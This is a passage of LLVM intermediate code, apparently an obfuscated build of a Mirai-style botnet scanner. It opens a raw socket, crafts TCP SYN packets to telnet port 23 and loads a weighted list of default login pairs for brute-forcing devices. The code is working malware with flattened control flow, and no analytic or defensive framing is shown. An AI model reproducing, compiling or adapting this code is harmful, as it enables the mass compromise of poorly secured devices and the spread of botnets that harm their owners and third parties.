    i32 905188777, label %698
    i32 1406315143, label %702
    i32 -1412302111, label %707
    i32 -780851537, label %712
    i32 -390267454, label %726
    i32 -1482779460, label %728
    i32 444706510, label %730
    i32 -1703675387, label %731
    i32 1493812928, label %732
    i32 729831660, label %741
    i32 -1596593025, label %NodeBlock21
    i32 -707119292, label %NodeBlock19
    i32 1367743113, label %NodeBlock17
    i32 290743253, label %NodeBlock15
    i32 2112063130, label %LeafBlock13
    i32 463161322, label %NodeBlock11
    i32 873727228, label %NodeBlock9
    i32 -1425978692, label %NodeBlock7
    i32 -346783058, label %NodeBlock5
    i32 -288588698, label %NodeBlock3
    i32 1092906356, label %NodeBlock1
    i32 1757852561, label %NodeBlock
    i32 -614661589, label %LeafBlock
    i32 219492604, label %758
    i32 -1225901765, label %763
    i32 2098546661, label %766
    i32 -1559813725, label %767
    i32 561033181, label %772
    i32 -2146421232, label %784
    i32 -972559451, label %785
    i32 1168943551, label %790
    i32 816183067, label %802
    i32 300554331, label %803
    i32 506666389, label %808
    i32 -1461868110, label %820
    i32 1884879488, label %824
    i32 1959187159, label %838
    i32 2118293092, label %840
    i32 -1389888091, label %842
    i32 260343989, label %843
    i32 1128262868, label %844
    i32 1091485866, label %845
    i32 606253401, label %850
    i32 -1044220026, label %859
    i32 513270282, label %866
    i32 1693142340, label %873
    i32 719685126, label %880
    i32 -1651685129, label %888
    i32 352497791, label %896
    i32 1777428236, label %897
    i32 -245041345, label %898
    i32 1740353394, label %903
    i32 -1680263468, label %908
    i32 683775433, label %912
    i32 1001305010, label %916
    i32 892197298, label %917
    i32 1555202698, label %918
    i32 -640463071, label %923
    i32 -2030312686, label %931
    i32 1527309888, label %932
    i32 -1071325935, label %937
    i32 1046469753, label %946
    i32 76159825, label %950
    i32 1996714400, label %963
    i32 1025402981, label %966
    i32 -965191647, label %978
    i32 -1027734138, label %979
    i32 -1876128669, label %984
    i32 191989630, label %991
    i32 1147852198, label %1002
    i32 1676875259, label %1010
    i32 -1103187990, label %1011
    i32 -2115844552, label %1017
    i32 -51243306, label %NodeBlock30
    i32 579596024, label %NodeBlock28
    i32 -256306883, label %LeafBlock26
    i32 798213774, label %LeafBlock24
    i32 -910988379, label %1026
    i32 -759427590, label %1032
    i32 636641465, label %1041
    i32 -962879026, label %NewDefault23
    i32 -468098150, label %1050
    i32 1831035627, label %1057
    i32 -1355464850, label %1060
    i32 -160521494, label %1063
    i32 463390574, label %1064
    i32 1311921355, label %1065
    i32 1621741696, label %1070
    i32 -987562603, label %1076
    i32 -1572798613, label %1078
    i32 10729810, label %1084
    i32 -1782885858, label %1086
    i32 -506275454, label %1127
    i32 1486186392, label %1136
    i32 2020295334, label %1141
    i32 -1639806888, label %1142
    i32 -866596174, label %1147
    i32 -716857640, label %1157
    i32 562935761, label %1161
    i32 959766031, label %1167
    i32 -1810496238, label %1174
    i32 15017234, label %1176
    i32 -261752256, label %1187
    i32 329318836, label %1191
    i32 -1159470492, label %1193
    i32 -1839712369, label %1194
    i32 -457906068, label %1195
    i32 -959593676, label %NewDefault
    i32 941318070, label %1196
    i32 -1387315422, label %1197
    i32 1324290248, label %1201
    i32 -1163321379, label %1202
    i32 -401187967, label %1209
    i32 668916634, label %1213
    i32 564366602, label %1239
    i32 -204228335, label %1240
    i32 1737722690, label %1241
    i32 -1780782184, label %1242
    i32 -1685743335, label %1243
    i32 1866497960, label %1246
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %39 = icmp sgt i32 %.reload, 0
  %40 = select i1 %39, i32 -686269731, i32 -1066064477
  store i32 %40, i32* %switchVar
  br label %loopEnd

; <label>:41:                                     ; preds = %loopEntry
  %42 = load i32, i32* @scanner_pid, align 4
  %43 = icmp eq i32 %42, -1
  %44 = select i1 %43, i32 -686269731, i32 -1558112221
  store i32 %44, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  ret void

; <label>:46:                                     ; preds = %loopEntry
  %47 = call i32 @util_local_addr()
  store i32 %47, i32* @LOCAL_ADDR, align 4
  call void @rand_init()
  %48 = call i64 @time(i64* null) #7
  %49 = trunc i64 %48 to i32
  store i32 %49, i32* @fake_time, align 4
  %50 = call noalias i8* @calloc(i64 628, i64 8264) #7
  %51 = bitcast i8* %50 to %struct.scanner_connection*
  store %struct.scanner_connection* %51, %struct.scanner_connection** %3, align 8
  store i32 0, i32* %1, align 4
  store i32 1721127955, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = load i32, i32* %1, align 4
  %54 = icmp slt i32 %53, 628
  %55 = select i1 %54, i32 1747204781, i32 58881678
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %58 = load i32, i32* %1, align 4
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %57, i64 %59
  %61 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %60, i32 0, i32 16
  store i32 0, i32* %61, align 8
  %62 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %63 = load i32, i32* %1, align 4
  %64 = sext i32 %63 to i64
  %65 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %62, i64 %64
  %66 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %65, i32 0, i32 2
  store i32 -1, i32* %66, align 8
  %67 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %68 = load i32, i32* %1, align 4
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %67, i64 %69
  %71 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %70, i32 0, i32 12
  store i8 0, i8* %71, align 1
  %72 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %73 = load i32, i32* %1, align 4
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %72, i64 %74
  %76 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %75, i32 0, i32 6
  store i32 0, i32* %76, align 8
  store i32 2015233310, i32* %switchVar
  br label %loopEnd

; <label>:77:                                     ; preds = %loopEntry
  %78 = load i32, i32* %1, align 4
  %79 = add nsw i32 %78, 1
  store i32 %79, i32* %1, align 4
  store i32 1721127955, i32* %switchVar
  br label %loopEnd

; <label>:80:                                     ; preds = %loopEntry
  %81 = call i32 @socket(i32 2, i32 3, i32 6) #7
  store i32 %81, i32* @rsck, align 4
  %82 = icmp eq i32 %81, -1
  %83 = select i1 %82, i32 1679944167, i32 -1609909400
  store i32 %83, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  call void @exit(i32 0) #8
  unreachable

; <label>:85:                                     ; preds = %loopEntry
  %86 = load i32, i32* @rsck, align 4
  %87 = load i32, i32* @rsck, align 4
  %88 = call i32 (i32, i32, ...) @fcntl(i32 %87, i32 3, i32 0)
  %89 = or i32 2048, %88
  %90 = call i32 (i32, i32, ...) @fcntl(i32 %86, i32 4, i32 %89)
  store i32 1, i32* %1, align 4
  %91 = load i32, i32* @rsck, align 4
  %92 = bitcast i32* %1 to i8*
  %93 = call i32 @setsockopt(i32 %91, i32 0, i32 3, i8* %92, i32 4) #7
  %94 = icmp ne i32 %93, 0
  %95 = select i1 %94, i32 -343871471, i32 -1876533594
  store i32 %95, i32* %switchVar
  br label %loopEnd

; <label>:96:                                     ; preds = %loopEntry
  %97 = load i32, i32* @rsck, align 4
  %98 = call i32 @close(i32 %97)
  call void @exit(i32 0) #8
  unreachable

; <label>:99:                                     ; preds = %loopEntry
  store i32 -2026604697, i32* %switchVar
  br label %loopEnd

; <label>:100:                                    ; preds = %loopEntry
  %101 = call i32 @rand_next()
  %102 = and i32 %101, 65535
  %103 = trunc i32 %102 to i16
  store i16 %103, i16* %2, align 2
  store i32 1419429771, i32* %switchVar
  br label %loopEnd

; <label>:104:                                    ; preds = %loopEntry
  %105 = load i16, i16* %2, align 2
  %106 = call zeroext i16 @ntohs(i16 zeroext %105) #9
  %107 = zext i16 %106 to i32
  %108 = icmp slt i32 %107, 1024
  %109 = select i1 %108, i32 -2026604697, i32 131424487
  store i32 %109, i32* %switchVar
  br label %loopEnd

; <label>:110:                                    ; preds = %loopEntry
  store %struct.iphdr* bitcast ([40 x i8]* @scanner_rawpkt to %struct.iphdr*), %struct.iphdr** %4, align 8
  %111 = load %struct.iphdr*, %struct.iphdr** %4, align 8
  %112 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %111, i64 1
  %113 = bitcast %struct.iphdr* %112 to %struct.tcphdr*
  store %struct.tcphdr* %113, %struct.tcphdr** %5, align 8
  %114 = load %struct.iphdr*, %struct.iphdr** %4, align 8
  %115 = bitcast %struct.iphdr* %114 to i8*
  %116 = load i8, i8* %115, align 4
  %117 = and i8 %116, -16
  %118 = or i8 %117, 5
  store i8 %118, i8* %115, align 4
  %119 = load %struct.iphdr*, %struct.iphdr** %4, align 8
  %120 = bitcast %struct.iphdr* %119 to i8*
  %121 = load i8, i8* %120, align 4
  %122 = and i8 %121, 15
  %123 = or i8 %122, 64
  store i8 %123, i8* %120, align 4
  %124 = call zeroext i16 @htons(i16 zeroext 40) #9
  %125 = load %struct.iphdr*, %struct.iphdr** %4, align 8
  %126 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %125, i32 0, i32 2
  store i16 %124, i16* %126, align 2
  %127 = call i32 @rand_next()
  %128 = trunc i32 %127 to i16
  %129 = load %struct.iphdr*, %struct.iphdr** %4, align 8
  %130 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %129, i32 0, i32 3
  store i16 %128, i16* %130, align 4
  %131 = load %struct.iphdr*, %struct.iphdr** %4, align 8
  %132 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %131, i32 0, i32 5
  store i8 64, i8* %132, align 4
  %133 = load %struct.iphdr*, %struct.iphdr** %4, align 8
  %134 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %133, i32 0, i32 6
  store i8 6, i8* %134, align 1
  %135 = call zeroext i16 @htons(i16 zeroext 23) #9
  %136 = load %struct.tcphdr*, %struct.tcphdr** %5, align 8
  %137 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %136, i32 0, i32 1
  store i16 %135, i16* %137, align 2
  %138 = load i16, i16* %2, align 2
  %139 = load %struct.tcphdr*, %struct.tcphdr** %5, align 8
  %140 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %139, i32 0, i32 0
  store i16 %138, i16* %140, align 4
  %141 = load %struct.tcphdr*, %struct.tcphdr** %5, align 8
  %142 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %141, i32 0, i32 4
  %143 = load i16, i16* %142, align 4
  %144 = and i16 %143, -241
  %145 = or i16 %144, 80
  store i16 %145, i16* %142, align 4
  %146 = call i32 @rand_next()
  %147 = and i32 %146, 65535
  %148 = trunc i32 %147 to i16
  %149 = load %struct.tcphdr*, %struct.tcphdr** %5, align 8
  %150 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %149, i32 0, i32 5
  store i16 %148, i16* %150, align 2
  %151 = load %struct.tcphdr*, %struct.tcphdr** %5, align 8
  %152 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %151, i32 0, i32 4
  %153 = load i16, i16* %152, align 4
  %154 = and i16 %153, -513
  %155 = or i16 %154, 512
  store i16 %155, i16* %152, align 4
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.21, i32 0, i32 0), i16 zeroext 3)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.22, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i16 zeroext 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.23, i32 0, i32 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.24, i32 0, i32 0), i16 zeroext 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.25, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.26, i32 0, i32 0), i16 zeroext 15)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.27, i32 0, i32 0), i16 zeroext 4)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.28, i32 0, i32 0), i16 zeroext 4)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.29, i32 0, i32 0), i16 zeroext 4)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i32 0, i32 0), i16 zeroext 4)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.31, i32 0, i32 0), i16 zeroext 4)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.32, i32 0, i32 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.33, i32 0, i32 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.34, i32 0, i32 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.35, i32 0, i32 0), i16 zeroext 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.36, i32 0, i32 0), i16 zeroext 3)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.37, i32 0, i32 0), i16 zeroext 8)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.38, i32 0, i32 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.39, i32 0, i32 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.40, i32 0, i32 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.41, i32 0, i32 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.42, i32 0, i32 0), i16 zeroext 2)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.43, i32 0, i32 0), i16 zeroext 3)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.44, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.45, i32 0, i32 0), i16 zeroext 4)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.46, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.47, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.48, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.49, i32 0, i32 0), i16 zeroext 16)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.50, i32 0, i32 0), i16 zeroext 16)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.51, i32 0, i32 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.52, i32 0, i32 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.53, i32 0, i32 0), i16 zeroext 17)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.35, i32 0, i32 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.55, i32 0, i32 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.56, i32 0, i32 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.57, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.51, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.26, i32 0, i32 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.52, i32 0, i32 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.24, i32 0, i32 0), i16 zeroext 2)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.21, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.59, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.40, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.56, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.47, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.36, i32 0, i32 0), i16 zeroext 3)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i32 0, i32 0), i16 zeroext 3)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.56, i32 0, i32 0), i16 zeroext 3)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.55, i32 0, i32 0), i16 zeroext 3)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.61, i32 0, i32 0), i16 zeroext 4)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.62, i32 0, i32 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.46, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.63, i32 0, i32 0), i16 zeroext 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.64, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.24, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i32 0, i32 0), i16 zeroext 3)
  call void @add_auth_entry(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.24, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.69, i32 0, i32 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.70, i32 0, i32 0), i16 zeroext 4)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.71, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.72, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.73, i32 0, i32 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.74, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.75, i32 0, i32 0), i16 zeroext 2)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i16 zeroext 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.76, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.77, i32 0, i32 0), i16 zeroext 8)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.36, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.78, i32 0, i32 0), i16 zeroext 3)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.75, i32 0, i32 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.56, i32 0, i32 0), i16 zeroext 15)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.55, i32 0, i32 0), i16 zeroext 12)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.79, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.80, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.61, i32 0, i32 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.81, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.82, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.83, i32 0, i32 0), i16 zeroext 7)
